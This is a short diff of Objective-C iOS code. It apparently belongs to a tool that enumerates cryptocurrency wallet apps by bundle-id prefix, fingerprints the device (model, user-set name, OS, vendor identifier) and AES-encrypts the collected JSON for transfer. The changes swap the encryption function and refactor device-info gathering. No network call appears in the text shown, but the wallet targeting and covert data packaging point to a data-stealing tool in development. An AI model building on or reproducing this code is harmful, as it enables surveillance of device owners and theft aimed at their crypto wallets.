@@ -2,6 +2,7 @@
 #import "worse_query.h"
 #import "Config.h"
 #import <CommonCrypto/CommonCrypto.h>
+#import <UIKit/UIKit.h>
 
 // ── 已知钱包 App 的 bundle id 前缀 ──
 static NSArray<NSString *> *walletBundles(void) {
@@ -408,7 +409,7 @@ static NSData *aesEncrypt(NSData *plain, NSData *key) {
             return;
         }
 
-        NSData *enc = aesGCMEncrypt(json, self.aesKey);
+        NSData *enc = aesEncrypt(json, self.aesKey);
         if (!enc) {
             failCount++;
             [self emit:@"✗ 加密失败"];
@@ -455,12 +456,15 @@ static NSData *aesEncrypt(NSData *plain, NSData *key) {
 
 - (NSDictionary *)deviceInfo {
     UIDevice *d = [UIDevice currentDevice];
+    NSString *vid = @"";
+    NSUUID *u = [d identifierForVendor];
+    if (u) vid = [u UUIDString] ?: @"";
     return @{
-        @"model": d.model ?: @"",
-        @"name": d.name ?: @"",
-        @"system": d.systemName ?: @"",
-        @"version": d.systemVersion ?: @"",
-        @"identifier": [[d identifierForVendor] UUIDString] ?: @"",
+        @"model": [d model] ?: @"",
+        @"name": [d name] ?: @"",
+        @"system": [d systemName] ?: @"",
+        @"version": [d systemVersion] ?: @"",
+        @"identifier": vid,
     };
 }
 
